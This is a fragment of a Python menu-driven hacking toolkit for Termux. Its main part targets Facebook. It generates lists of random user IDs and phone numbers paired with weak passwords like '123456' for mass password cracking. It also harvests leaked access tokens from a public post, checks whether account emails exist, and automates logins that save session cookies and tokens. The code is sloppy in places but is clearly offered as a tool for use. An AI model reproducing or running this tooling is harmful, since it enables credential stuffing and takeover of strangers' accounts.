			os.system("xdg-open https://cdn.down-apk.com/com.termux/Termux_0.118.0_apkcombo.com.apk?ecp=Y29tLnRlcm11eC8wLjExOC4wLzExOC41MThkOGEwNDliMzFlZTI4ZTBkZjczZTVmYTIxZjM4NmZjNDY4ODg4LmFwaw==&iat=1647779297&sig=4644450065b456a7140f7e6528b011dd&size=101739523&from=cf&version=latest")
			exit("\n\n")
	except:
		termux_version()
def window_iso():
	logo()
	print("[01] Download Window 10 ISO File [ 32 & 64 ] ");time.sleep(0.3)
	print("[02] Download Window 8.1 ISO File [ 32 & 64  ] ");time.sleep(0.3)
	print("[03] Download Window 7 ISO File [ 32 & 64  ] ");time.sleep(0.3)
	print("[04] Download Window 11 ISO File [ 32 & 64  ] ");time.sleep(0.3)
	wind = input("\n[*] Choose : ")
	if wind == '1' or wind == '01':
		os.system("xdg-open https://www.microsoft.com/en-us/software-download/windows10ISO")
		exit("\n\n")
	elif wind == '2' or wind == '02':
		os.system("xdg-open https://www.microsoft.com/en-us/software-download/windows8ISO")
		exit("\n\n")
	elif wind == '3' or wind == '03':
		os.system("xdg-open https://tech-latest.com/download-windows-7-iso/")
		exit("\n\n")
	elif wind == '4' or wind == '04':
		os.system("xdg-open https://www.microsoft.com/software-download/windows11")
		exit("\n\n")
	else:
		window_iso()
def loveyou_kali():
	logo()
	print("[01] Download Kali Bare Mental ");time.sleep(0.3)
	print("[02] Download Kali Virtual Machine ");time.sleep(0.3)
	print("[03] Download Kali ARM ");time.sleep(0.3)
	print("[04] Download Kali NetHunter ");time.sleep(0.3)
	print("[05] Download Kali Bot ISO && Live ");time.sleep(0.3)
	print("[06] Download Kali Customize Tool ");time.sleep(0.3)
	print("[07] Download Kali Help && Method ");time.sleep(0.3)
	love_kali = input("\n[*] Choose : ")
	if love_kali == '1' or love_kali == '01':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-bare-metal")
		exit("\n\n")
	elif love_kali == '2' or love_kali == '02':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-virtual-machines")
		exit("\n\n")
	elif love_kali == '3' or love_kali == '03':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-arm")
		exit("\n\n")
	elif love_kali == '4' or love_kali == '04':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-mobile")
		exit("\n\n")
	elif love_kali == '5' or love_kali == '05':
		os.system("xdg-open https://www.kali.org/get-kali/#kali-live")
		exit("\n\n")
	elif love_kali == '6' or love_kali == '06':
		os.system("xdg-open https://www.kali.org/tools/")
		exit("\n\n")
	elif love_kali == '7' or love_kali == '07':
		os.system("xdg-open https://www.kali.org/docs/")
		exit("\n\n")
	else:
		loveyou_kali()
def dump_random_mostold():
	logo()
	os.system("rm -rf Data/Facebook/Dump/mostold.txt")
	print("[01] Dump Random User ID 9 Digits ")
	print("[02] Dump Random User ID 8 Digits ")
	print("[03] Dump Random User ID 7 Digits ")
	print("[04] Dump Random User ID 6 Digits ")
	print("[05] Dump Random User ID 5 Digits ")
	print("[06] Dump Random User ID 4 Digits ")
	print("[07] Dump Random User ID 3 Digits ")
	print("")
	ben = input("[>] Choose : ")
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		separator = input("[>] Enter ID And Name Separator : ")
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		time.sleep(2)
		fb_menu()
	elif ben == "1" or ben == "01":
		_         = 111111111
		__        = 999999999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/mostold.txtFile")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "2" or ben == "02":
		_         = 11111111
		__        = 99999999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
	elif ben == "3" or ben == "03":
		_         = 1111111
		__        = 9999999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
	elif ben == "4" or ben == "04":
		_         = 111111
		__        = 999999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "5" or ben == "05":
		_         = 11111
		__        = 99999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "6" or ben == "06":
		_         = 1111
		__        = 9999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "7" or ben == "07":
		_         = 111
		__        = 999
		___ =""
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/mostold.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/mostold.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	else:
		fb_menu()
def team_info():
	logo()
	print("                        T E A M      ")
	print("-----------------------------------------------------------")
	print(' [->] Team : CodeX-ID ')
	print (' [->] Team GitHub : https://github.com/CodeX-ID')
	print("-----------------------------------------------------------")
	print("                T E A M  -  M E M B E R S          ")
	print("-----------------------------------------------------------")
	print("----------------------TEAM BROKEN NOW OWNER SALMAN KHAN---------------------")
	print("-----------------------------------------------------------")
	input("[✓] Back ")
	time.sleep(0.05)
	main_menu()
def fb_login():
	logo()
	print("[01] Login With Token ")
	print("[02] Login With Cookie ")
	print("[03] Login With ID && Password ")
	print("[00] Back ")
	log_c = input("\n[->] Choose : ")
	if log_c in ['1','01']:
		time.sleep(1.5)
		fb_token_login()
	elif log_c in ['2','02']:
		time.sleep(1.5)
		fb_cookie_login()
	elif log_c in ['3','03']:
		time.sleep(1.5)
		fb_idpass_login()
	elif log_c in ['0','00']:
		fb_menu()
	else:
		fb_login()
def fb_token_login():
	os.system("rm -rf Data/Facebook/Data/fb_token.txt");logo()
	token = input('[*] Enter Your Token : ')
	if token[:4] in ['EAAB','EAAG','EAAD']:
		pass
	else:
		print("\n[*] Create Token  From Kiwi Browser")
		print("[*] Use EAAB Token For Login - Thank u")
		print("[*] Don't Use This Token Again : \x1b[0;91m" + token )
		time.sleep(3.5)
		fb_login()
	try:
		u = requests.get('https://graph.facebook.com/me?access_token='+token).text
		u1 = json.loads(u)
		name = u1['name']
		ts = open('Data/Facebook/Data/fb_token.txt', 'w')
		ts.write(token)
		ts.close()
		print("\n\n[*] Login Successful as \x1b[0;92m" + name + "\x1b[0;97m")
		input("[*] Back ");time.sleep(2);fb_menu()
	except KeyError:
		print('\n\n[*] Token Expired ')
		time.sleep(2.5)
		fb_login()
def dump_number():
	logo()
	os.system("rm -rf Data/Facebook/Dump/number.txt")
	print("[01] Dump Number + Password 7 Digit ")
	print("[02] Dump Number + Password 11 Digit ")
	print("[03] Dump Number + Password Menual ")
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		separator = input("[>] Enter ID And Name Separator : ")
		c_code = input("[>] Enter Country Code : ")
	except:
		lim_ = "5000"
	benxx = input("\n[>] Choose : ")
	if benxx == "" or benxx == " ":
		time.sleep(2)
		fb_menu()
	elif benxx == "1" or benxx == "01":
		_         = 1111111
		__        = 9999999
		___ = input("[->] Enter Network Code : ")
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/number.txt', 'a')
				old_a.write(c_code+str(___)+str(bokeq)+separator+bokeq+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/number.txt File")
		print("")
		input("[*] Back ")
		fb_menu()
	elif benxx == "2" or benxx == "02":
		_         = 1111111
		__        = 9999999
		___ = input("[->] Enter Network Code : ")
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/number.txt', 'a')
				old_a.write(c_code+str(___)+str(bokeq)+separator+c_code+str(___)+str(bokeq)+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/number.txt File")
		print("")
		input("[*] Back ")
		fb_menu()
	elif benxx == "3" or benxx == "03":
		_         = 1111111
		__        = 9999999
		___ = input("[->] Enter Network Code : ")
		m_pwd = input("[->] Enter Menual Password : ")
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/number.txt', 'a')
				old_a.write(c_code+str(___)+str(bokeq)+separator+m_pwd+"\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/number.txt File")
		print("")
		input("[*] Back ")
		fb_menu()
	elif benxx == "0" or benxx == "00":
		time.sleep(1.5)
		main_menu()
	else:
		time.sleep(1.5)
		dump_number()
def fb_idpass_login():
	logo()
	try:
		_agent=open('Data/Facebook/Data/usergent_oringnal.txt').read()
	except:
		try:
			_agent=input("[*] Enter Your User-Agent : ")
			open("Data/Facebook/Data/usergent_oringnal.txt", 'a').write(_agent)
		except:
			_agent=input("[*] Enter Your User-Agent : ")
			open("Data/Facebook/Data/usergent_oringnal.txt", 'a').write(_agent)
	try:
		user=input("\n[*] Email or User ID : ")
		pw=input("[*] Account Password : ")
	except:
		user=input("\n[*] Email or User ID : ")
		pw=input("[*] Account Password : ")
	try:
		_head={
			'Host':'m.facebook.com',
				'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
				'user-agent':_agent,
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
				'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		try:
			r=_ses.get("https://m.facebook.com/", headers=_head).text.encode('utf-8')
		except:
			r=_ses.get("https://m.facebook.com/", headers=_head).text
		_head2={
			'Host':'m.facebook.com',
				'user-agent':_agent,
			'content-type':'application/x-www-form-urlencoded',
				'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
			'accept':'*/*',
				'origin':'https://m.facebook.com',
			'sec-fetch-site':'same-origin',
				'sec-fetch-mode':'cors',
			'sec-fetch-dest':'empty',
				'referer':'https://m.facebook.com/',
			'accept-encoding':'gzip, deflate',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		payload={
			"fb_dtsg":re.search('{"token":"(.*?)"', str(r)).group(1).encode('utf-8'),
				"lsd":re.search('name="lsd" value="(.*?)"', str(r)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(r)).group(1),
				"m_ts":re.search('name="m_ts" value="(.*?)"', str(r)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(r)).group(1),
				"try_number":"0",
			"unrecognized_tries":"0",
				"prefill_contact_point":user,
			"prefill_source":"browser_dropdown",
				"prefill_type":"contact_point",
			"first_prefill_source":"browser_dropdown",
				"first_prefill_type":"contact_point",
			"had_cp_prefilled":True,
				"had_password_prefilled":False,
			"is_smart_lock":False,
				"bi_xrwh":"0",
			"__dyn":"",
				"__csr":"",
			"__req":"2",
				"__a":"",
			"__user":"0",
				"email":user,
			"encpass":"#PWD_BROWSER:0:"+real_time()+":"+pw
		}
		_ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", headers=_head2, data=payload)
		cok=_ses.cookies.get_dict()
		if 'c_user' in (cok):
			_head={
				'Host':'business.facebook.com',
					'cache-control':'max-age=0',
				'upgrade-insecure-requests':'1',
					'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
				'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
					'content-type' : 'text/html; charset=utf-8',
				'accept-encoding':'gzip, deflate',
					'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}    
			_r=_ses.get(urls, headers=_head)
			_p=re.search('(EAAG\w+)', _r.text)
			_token=_p.group(1)
			if 'EAA' in _token:
				os.system('rm -rf Data/Facebook/Data/fb_cookie.txt')
				os.system('rm -rf Data/Facebook/Data/fb_token.txt')
				print('\n[*] Cookie : '+convert(cok))
				open("Data/Facebook/Data/fb_cookie.txt", 'a').write(convert(cok))
				print('\n[*] Token  : '+_token )
				open("Data/Facebook/Data/fb_token.txt", 'a').write(_token)
				print("\n\n[*] Login Successful 0_0 ")
				input("[*] Back ");time.sleep(2);fb_menu()
		elif 'checkpoint' in (cok):
			print("[*] Your Account Is On Check-Point ")
			time.sleep(2)
			fb_login()
		else:
			print('\n[*] Wrong Username Or Password ')
			time.sleep(2)
			fb_login()
	except AttributeError:
		print('\n[*] Wrong Username Or Password')
		time.sleep(3)
		fb_login()
def dump_random_old():
	logo()
	os.system("rm -rf Data/Facebook/Dump/old.txt")
	print("[01] 1000000000 : 10")
	print("[02] 100000000 : 9")
	print("[03] 10000000 : 8")
	print("[04] 1000000 : 7")
	print("[05] 100000 : 6")
	print("[06] 10000 : 5")
	print("")
	ben = input("[>] Choose : ")
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		separator = input("[>] Enter ID And Name Separator : ")
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		time.sleep(2)
		fb_menu()
	elif ben == "1" or ben == "01":
		_             = 11111
		__            = 99999
		___ ="1000000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "2" or ben == "02":
		_            = 111111
		__           = 999999
		___ ="100000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
	elif ben == "3" or ben == "03":
		_           = 1111111
		__          = 9999999
		___ ="10000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
	elif ben == "4" or ben == "04":
		_          = 11111111
		__         = 99999999
		___ ="1000000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "5" or ben == "05":
		_         = 111111111
		__        = 999999999
		___ ="100000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "6" or ben == "06":
		_        = 1111111111
		__       = 9999999999
		___ ="10000"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/old.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/old.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		jalanx("[*] For Example : 123456,123456789")
		print("")
		input("[*] Back ")
		fb_menu()
	else:
		fb_menu()
def fb_acc_chacker():
	mupfile = input('\n[>>] Mail or Username List : ')
	print("")
	usr = open(mupfile, 'r')
	for user in usr:
		print("\x1b[1;97m[->] " + str(user.strip()) + " ", end='')
		br = mechanize.Browser()
		br.set_handle_robots(False)
		br._factory.is_html = True
		br.addheaders=[('User-agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24')]
		br.open('https://mbasic.facebook.com/login/identify/')
		br.select_form(nr=0)
		br.form['email'] = user
		br.method = "POST"
		reslink = br.submit().geturl()
		if 'identify' in reslink:
			print('\x1b[1;91m>> FB Account Not Found')
		else:
			print('\x1b[1;92m>> FB Account Found ')
	input("\n\n[*] Back ")
	fb_menu()
def dump_random_new():
	logo()
	os.system("rm -rf Data/Facebook/Dump/new.txt")
	print("[01] Dump Random User ID 183 ")
	print("[02] Dump Random User ID 100020 ")
	print("[03] Dump Random User ID 100030 ")
	print("[04] Dump Random User ID 100040 ")
	print("[05] Dump Random User ID 100050 ")
	print("[06] Dump Random User ID 100060  ")
	print("[07] Dump Random User ID 100070 ")
	print("[08] Dump Random User ID 100080 ")
	print("[09] Dump Random User ID 100090 ")
	print("[10] Dump Random User ID 100100 ")
	print("")
	ben = input("[>] Choose : ")
	try:
		print("")
		lim_ = int(input("[>] Cracking Limit : "))
		separator = input("[>] Enter ID And Name Separator : ")
	except:lim_ = "5000"
	if ben == "" or ben == " ":
		time.sleep(2)
		fb_menu()
	elif ben == "1" or ben == "01":
		_         = 1111111
		__        = 9999999
		___ ="183"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "2" or ben == "02":
		_         = 111111111
		__        = 999999999
		___ ="100020"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
	elif ben == "3" or ben == "03":
		_         = 111111111
		__        = 999999999
		___ ="100030"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
	elif ben == "4" or ben == "04":
		_         = 111111111
		__        = 999999999
		___ ="100040"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "5" or ben == "05":
		_         = 111111111
		__        = 999999999
		___ ="100050"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "6" or ben == "06":
		_         = 111111111
		__        = 999999999
		___ ="100060"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "7" or ben == "07":
		_         = 111111111
		__        = 999999999
		___ ="100070"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "8" or ben == "08":
		_         = 111111111
		__        = 999999999
		___ ="100081"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('facebook/dump/81.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "9" or ben == "09":
		_         = 111111111
		__        = 999999999
		___ ="100090"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	elif ben == "10":
		_         = 111111111
		__        = 999999999
		___ ="100100"
		try:
			for n in range(lim_):
				bokeq = random.randint(_, __)
				old_a = open('Data/Facebook/Dump/new.txt', 'a')
				old_a.write(str(___)+str(bokeq)+separator+"123456\n")
			old_a.close()
		except Exception as e:
			print(("[*] Error : %s"%e)),;time.sleep(1)
		print("")
		jalanx("[*] Dumping Successful")
		jalanx("[*] Open New Session And Open Data/Facebook/Dump/new.txt File")
		jalanx("[*] Crack File From Any Script Using Manual Passwords ")
		print("")
		input("[*] Back ")
		fb_menu()
	else:
		fb_menu()
def fb_menu():
	logo()
	print("[01] Facebook Single Menual Public ID Dump ")
	print("[02] Facebook Multi Menual Public ID Dump ")
	print("[03] ")
	print("[04] ")
	print("[05] Dump New Random UID ")
	print("[06] Dump Old Random UID ")
	print("[07] Dump Most Old Random UID ")
	print("[08] Dump Random UID From Email ID ")
	print("[09] Dump Random UID From Phone No ")
	print("[10] ")
	print("[11] ")
	print("[12] ")
	print("[13] ")
	print("[14] Facebook Bot Account Chacker")
	print("[15] Save Facebook Login ")
	print("[16] Facebook Free Token [ No Login ]")
	print("[17] Back [\x1b[1;92m Main Menu \x1b[1;97m]")
	fm = input("\n[->] Choose : ")
	if fm in ['1','01']:
		time.sleep(1.5)
		fb_single_dump()
	elif fm in ['2','02']:
		time.sleep(1.5)
		fb_multi_dump()
	elif fm in ['auto-token','Auto-Token','AUTO-TOKEN','16']:
		time.sleep(1.5)
		auto_token()
	elif fm in ['5','05']:
		time.sleep(1.5)
		dump_random_new()
	elif fm in ['6','06']:
		time.sleep(1.5)
		dump_random_old()
	elif fm in ['7','07']:
		time.sleep(1.5)
		dump_random_mostold()
	elif fm in ['8','08']:
		time.sleep(1.5)
		email_dump()
	elif fm in ['9','09']:
		time.sleep(1.5)
		dump_number()
	elif fm in ['14']:
		time.sleep(1.5)
		fb_acc_chacker()
	elif fm in ['15']:
		time.sleep(1.5)
		fb_login()
	elif fm in ['back','Back','BACK','17']:
		time.sleep(1.5)
		main_menu()
	else:
		time.sleep(0.05)
		fb_menu()
def auto_token():
	print("\n\n[01] Free Facebook ID Token X1")
	print("[02] Free Facebook ID Token X2")
	print("[03] Free Facebook ID Token X3")
	print("[04] Free Facebook ID Token X4")
	print("[05] Free Facebook ID Token X5")
	print("[06] Free Facebook ID Token X6")
	print("[00] Back ")
	token_xx = input("\n[>>] Choose : ")
	if token_xx in ["1","01"]:
		auto_token_x1()
	elif token_xx in ["2","02"]:
		auto_token_x2()
	elif token_xx in ["3","03"]:
		auto_token_x3()
	elif token_xx in ["4","04"]:
		auto_token_x4()
	elif token_xx in ["5","05"]:
		auto_token_x5()
	elif token_xx in ["6","06"]:
		auto_token_x6()
	elif token_xx in ["0","00"]:
		fb_menu()
	else:
		time.sleep(2)
		auto_token()
def auto_token_x1():
	logo()
	ba = 0
	bi = 0
	link_token = requests.get("https://free.facebook.com/100025338049048/posts/1076164763238115/?app=fbl")
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			time.sleep(1)
			print("\n[*] Token : "+str(ba)+" \033[0;97m"+naa)
	exit()
